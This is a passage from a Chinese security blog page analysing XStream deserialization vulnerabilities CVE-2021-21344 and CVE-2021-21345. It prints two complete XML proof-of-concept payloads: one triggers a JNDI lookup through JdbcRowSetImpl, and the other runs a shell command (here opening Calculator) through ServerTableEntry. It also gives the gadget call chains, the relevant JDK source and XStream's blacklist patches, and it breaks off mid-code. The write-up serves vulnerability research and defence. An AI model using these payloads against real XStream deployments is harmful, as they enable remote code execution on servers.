钟师傅</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>从POC中可以看出</p><ol><li>最终的RCE触发点是JdbcRowSetImpl jndi类型注入漏洞</li><li>出发点是PriorityQueue自动调用compare方法</li></ol><p>PriorityQueue这个也是cc链中被用到的，PriorityQueue实现了Serializable，且重写了readObject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>heapify 是个排序操作，调用了每个key的compare方法</p><p>具体的调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>个人认为这个关键利用点是com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Method getter;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ValueT <span class="title">get</span><span class="params">(BeanT bean)</span> <span class="keyword">throws</span> AccessorException </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 此处可以任意执行</span></span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.getter.invoke(bean);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IllegalAccessException var3) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessError(var3.getMessage());</span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">this</span>.handleInvocationTargetException(var4);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>在Java原生反序列化中，这里非Serializable并没有问题，但是XStream不受限制所有类都可以实例化，导致了中间可以有很多节点可以用来作为构造链的节点。</p><h3 id="黑名单：-1"><a href="#黑名单：-1" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><p>author：钟师傅</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br><span class="line">        &lt;indexMap <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br><span class="line">              &lt;dataSource <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br><span class="line">                &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br><span class="line">                  &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br><span class="line">                    &lt;bi <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">sun</span>.<span class="title">corba</span>.<span class="title">se</span>.<span class="title">impl</span>.<span class="title">activation</span>.<span class="title">ServerTableEntry</span>&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">name</span>&gt;<span class="title">verify</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">parameter</span>-<span class="title">types</span>/&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">getter</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;/<span class="title">inheritedAttWildcard</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">bi</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">tagName</span>/&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">context</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;<span class="title">marshallerPool</span> <span class="title">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br><span class="line">                        &lt;outer-<span class="class"><span class="keyword">class</span> <span class="title">reference</span></span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br><span class="line">                  &lt;activationCmd&gt;open /Applications/Calculator.app&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> String activationCmd;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">verify</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               System.out.println(<span class="string">&quot;Server being verified w/&quot;</span> + activationCmd);</span><br><span class="line"></span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">           <span class="keyword">int</span> result = process.waitFor();</span><br><span class="line">           ...</span><br><span class="line">           </span><br><span class="line">   <span class="comment">//synchronized 是同步锁</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> org.omg.CORBA.SystemException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       state = ACTIVATED;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               printDebug(<span 